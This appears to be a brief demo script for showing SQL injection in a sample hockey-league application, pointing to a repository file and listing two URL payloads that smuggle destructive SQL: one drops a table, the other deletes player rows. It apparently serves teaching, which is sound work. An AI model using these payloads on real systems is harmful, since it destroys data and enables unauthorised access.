# SQL Injection example

1. Show the code in `Infrastructure\HockeyLeague\Repository\TeamRepository.cs`

2. Select a group page to inject some SQL.

3. Change the end of the URL for the following:

```url
10'; DROP TABLE TEST;--
10'; DELETE FROM PLAYERS WHERE TeamID='10' AND JerseyNumber = 20;--
```
